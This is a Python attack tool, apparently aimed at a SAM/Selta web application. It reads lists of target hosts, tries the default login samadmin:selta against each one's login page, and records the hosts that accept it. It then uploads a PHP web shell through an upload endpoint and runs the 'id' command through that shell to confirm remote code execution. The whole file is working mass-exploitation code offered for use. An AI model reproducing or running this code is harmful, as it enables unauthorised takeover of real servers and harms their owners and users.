import os, sys
from host import host
import requests, requests.exceptions
import re
class SamipExploit:
    def samipBruteForce(self):
        params = {'lang': 'it', 'username': 'samadmin', 'MultiDOminio': '0', 'password': 'selta', 'submit': 'LOGIN'}
        path = os.path.abspath(os.path.dirname(sys.argv[0]))
        vulnerable_host = open(path + '/host/up_host.txt', 'r').read().splitlines()
        a = 0
        while a < len(vulnerable_host):
            try:
                res = vulnerable_host[a]
                address = host.Host.addressRegex(res)
                if address['port'] == 443 or address['port'] == 8888:
                    url = "https://" + address['ip'] + ":" + "/php/SamLogin.php"
                else:
                    url = "http://" + address['ip'] + ":" + str(address['port'])+ "/php/SamLogin.php"
                try:
                    r = requests.post(url, data=params, verify=False)
                    if 'Pannello' in r.text or 'sessione' in r.text:
                        print("[-] Found http://" + address['ip'] + ":" + str(address['port']) + " with credentials samadmin:selta")
                    with open(path + '/host/vuln_host.txt', 'a') as host_vuln:
                        host_vuln.write(address['ip']+ ':' + str(address['port']) + "\n")
                except:
                    pass
            except:
                pass
            a += 1
    def samipRCEexploit(self):
        path = os.path.abspath(os.path.dirname(sys.argv[0]))
        vulnerable_host = open(path + '/host/vuln_host.txt', 'r').read().splitlines()
        a = 0
        while a < len(vulnerable_host):
            try:
                res = vulnerable_host[a]
                address = host.Host.addressRegex(res)
                if address['port'] == 443 or address['port'] == 8888:
                    url = "https://" + address['ip'] + ":" + "/php/"
                else:
                    url = "http://" + address['ip'] + ":" + str(address['port'])
                file = {'userfile': ('shell.php', open('exploit/shell.php','rb').read(),'application/octet-stream')}
                vulnLink = url + "/php/GestUpload_DaBrowser.php"
                try:
                    upload = requests.post(vulnLink, files=file)
                    if 'successfully' in upload.text:
                        shellLink = url + "/pub//www/uploads/5555/shell.php"
                        print("[...] Testing the web shell")
                        command = requests.get(shellLink+"?cmd=id")
                        s = command.text
                        print(shellLink)
                        line = s.split('<pre>')[1].split('</pre>')[0]
                        user = line.split('(')[1].split(')')[0]
                        print("[!] Shell up with user: " + user + " and id: " + line.split('=')[1].split('(')[0])
                except:
                    a += 1
            except:
                a += 1
            a += 1
